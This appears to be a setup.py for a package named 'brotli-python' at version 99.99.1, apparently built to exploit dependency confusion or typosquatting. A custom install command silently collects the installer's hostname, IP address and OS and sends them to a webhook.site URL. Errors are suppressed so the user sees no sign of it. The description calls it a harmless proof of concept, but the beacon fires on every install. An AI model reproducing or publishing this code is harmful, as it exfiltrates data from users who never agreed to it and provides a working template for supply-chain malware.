from setuptools import setup
from setuptools.command.install import install
import urllib.request
import platform
import socket

# Webhook URL
BEACON_URL = "https://webhook.site/66c4d84a-ac76-4b83-bb68-5a992164c7b7"

# Beacon function
def send_beacon():
    try:
        # Capture basic system info
        hostname = socket.gethostname()
        ip = socket.gethostbyname(hostname)
        os_info = f"{platform.system()}_{platform.release()}"
        # Send GET request
        url = f"{BEACON_URL}?ip={ip}&host={hostname}&os={os_info}"
        req = urllib.request.Request(url, method="GET")
        with urllib.request.urlopen(req, timeout=3):
            pass
    except Exception:
        pass

# Custom install command
class InstallWithBeacon(install):
    def run(self):
        send_beacon()        # fire beacon during install
        install.run(self)    # continue normal installation

setup(
    name="brotli-python",
    version="99.99.1",
    packages=["brotli_python"],
    description="POC package capturing installer IP (harmless)",
    cmdclass={'install': InstallWithBeacon},
)
